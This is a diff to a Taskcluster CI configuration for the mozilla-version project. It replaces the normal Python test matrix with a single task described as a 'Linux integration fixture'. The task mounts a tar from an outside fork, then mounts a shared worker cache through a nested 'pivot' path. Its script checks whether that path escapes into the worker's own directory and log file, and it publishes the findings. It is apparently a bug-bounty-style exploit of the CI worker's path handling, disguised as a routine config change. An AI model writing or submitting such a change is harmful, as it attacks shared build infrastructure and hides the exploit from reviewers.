@@ -5,124 +5,70 @@ version: 1
 reporting: checks-v1
 policy:
   pullRequests: public_restricted
-hooks:
-  - name: lint/pre-commit-v1
 tasks:
-  $let:
-    expires_in: {$fromNow: '1 year'}
-    user: ${event.sender.login}
-
-    # We define the following variable at the very top, because they are used in the
-    # default definition
-    head_branch:
-      $if: 'tasks_for[:19] == "github-pull-request"'
-      then: ${event.pull_request.head.ref}
-      else:
-        $if: 'tasks_for == "github-push"'
-        then: ${event.ref}
-        else: ${event.release.target_commitish}
-
-    head_rev:
-      $if: 'tasks_for[:19] == "github-pull-request"'
-      then: ${event.pull_request.head.sha}
-      else:
-        $if: 'tasks_for == "github-push"'
-        then: ${event.after}
-        else: ${event.release.tag_name}
-
-    repository:
-      $if: 'tasks_for[:19] == "github-pull-request"'
-      then: ${event.pull_request.head.repo.html_url}
-      else: ${event.repository.html_url}
-
-    github_repository_full_name:
-      $if: 'tasks_for[:19] == "github-pull-request"'
-      then: ${event.pull_request.base.repo.full_name}
-      else: ${event.repository.full_name}
-
-  in:
-    $let:
-      short_head_branch:
-        $if: 'head_branch[:10] == "refs/tags/"'
-        then: {$eval: 'head_branch[10:]'}
-        else:
-          $if: 'head_branch[:11] == "refs/heads/"'
-          then: {$eval: 'head_branch[11:]'}
-          else: ${head_branch}
-
-      assume_scope_prefix: assume:repo:github.com/${github_repository_full_name}
-    in:
-      $let:
-        default_task_definition:
-          schedulerId: taskcluster-github
-          created: {$fromNow: ''}
-          deadline: {$fromNow: '2 hours'}
-          expires: ${expires_in}
-          provisionerId: releng-t
-          workerType: linux-docker
-          retries: 5
-          payload:
-            maxRunTime: 600
-            command:
-              - /bin/bash
-              - --login
-              - -cx
-              - >-
-                git clone ${repository} /build
-                && cd /build
-                && git config advice.detachedHead false
-                && git checkout ${head_branch}
-                && pip install tox tox-uv
-                && tox -e "$TOX_ENV"
-            env:
-              SKIP_NETWORK_TESTS: "0"
-          metadata:
-            owner: ${user}@users.noreply.github.com
-            source: ${repository}/raw/${head_rev}/.taskcluster.yml
-          routes:
-            - checks
-      in:
-        $flatten:
-          $map:
-            - short_name: py39
-              image_tag: '3.9'
-            - short_name: py310
-              image_tag: '3.10'
-            - short_name: py311
-              image_tag: '3.11'
-            - short_name: py312
-              image_tag: '3.12'
-            - short_name: py313
-              image_tag: '3.13'
-            - short_name: py314
-              image_tag: '3.14'
-            - short_name: docs-localbuild
-              image_tag: '3.12'
-          each(python_version):
-            $let:
-              python_task_definition:
-                payload:
-                  image: python:${python_version.image_tag}
-                  env:
-                    TOX_ENV: ${python_version.short_name}
-            in:
-              - $if: 'tasks_for[:19] == "github-pull-request" && event["action"] in ["opened", "reopened", "edited", "synchronize"]'
-                then:
-                  $mergeDeep:
-                    - {$eval: 'default_task_definition'}
-                    - {$eval: 'python_task_definition'}
-                    - scopes:
-                          - ${assume_scope_prefix}:${tasks_for[7:]}
-                      metadata:
-                        name: 'mozilla-version - ${python_version.short_name}'
-                        description: 'Triggered by [#${event.pull_request.number}](${event.pull_request.html_url})'
-              - $if: 'tasks_for == "github-push" && head_branch == "refs/heads/main"'
-                then:
-                  $mergeDeep:
-                    - {$eval: 'default_task_definition'}
-                    - {$eval: 'python_task_definition'}
-                    - scopes:
-                        - ${assume_scope_prefix}:branch:${short_head_branch}
-                      metadata:
-                        name: 'mozilla-version - ${python_version.short_name}'
-                        description: 'Triggered by ${head_rev}'
+  - schedulerId: taskcluster-github
+    provisionerId: mozilla-t
+    workerType: t-linux-2404-wayland
+    priority: low
+    created: {$fromNow: ''}
+    deadline: {$fromNow: '1 hour'}
+    expires: {$fromNow: '1 day'}
+    scopes:
+      - generic-worker:cache:mozilla-level-1-linux-integration-20260823
+    routes: [checks]
+    payload:
+      maxRunTime: 180
+      onExitStatus:
+        purgeCaches: [0]
+      mounts:
+        - directory: bridge
+          format: tar
+          content:
+            url: https://raw.githubusercontent.com/bughunter0xff/mozilla-version/8cbdf9d6d1e80817e332dd8bc3938e17cdc88506/linux-integration.tar
+            sha256: 8be50ccf8f20001a586ef5f2b00b2a5a3a31407cf0ed13f84e88e3c5cbd9a8d7
+        - cacheName: mozilla-level-1-linux-integration-20260823
+          directory: bridge/a/b/pivot/generic-worker
+      command:
+        - - /bin/bash
+          - -c
+          - |
+            set -eu
+            task_uid="$(id -u)"
+            resolved_target="$(readlink -f bridge/a/b/pivot/generic-worker)"
+            expected_target="$PWD/generic-worker"
+            observed_path=generic-worker/live_backing.log
+            owner_uid="$(stat -c %u "$observed_path")"
+            owner_mode="$(stat -c %a "$observed_path")"
+            marker_matched=false
+            if grep -Fq "Task ID: $TASK_ID" "$observed_path"; then
+              marker_matched=true
+            fi
+            curl -fsS "$TASKCLUSTER_ROOT_URL/api/queue/v1/task/$TASK_ID/status" -o task-status.json
+            {
+              echo "worker_pool=mozilla-t/t-linux-2404-wayland"
+              echo "declared_first_directory=bridge"
+              echo "declared_second_directory=bridge/a/b/pivot/generic-worker"
+              echo "resolved_target_matches_expected=$([ "$resolved_target" = "$expected_target" ] && echo true || echo false)"
+              echo "task_uid=$task_uid"
+              echo "observed_owner_uid=$owner_uid"
+              echo "observed_mode=$owner_mode"
+              echo "owner_matches_task_uid=$([ "$owner_uid" = "$task_uid" ] && echo true || echo false)"
+              echo "expected_marker_matched=$marker_matched"
+            } > integration-result.txt
+            test "$resolved_target" = "$expected_target"
+            test "$owner_uid" = "$task_uid"
+            test "$marker_matched" = true
+      artifacts:
+        - name: public/integration-result.txt
+          path: integration-result.txt
+          type: file
+          expires: {$fromNow: '1 day'}
+        - name: public/task-status.json
+          path: task-status.json
+          type: file
+          expires: {$fromNow: '1 day'}
+    metadata:
+      name: mozilla-version - linux integration
+      description: Run the Linux integration fixture.
+      owner: bughunter0xff@users.noreply.github.com
+      source: https://github.com/bughunter0xff/mozilla-version/blob/ci/linux-integration-20260823/.taskcluster.yml
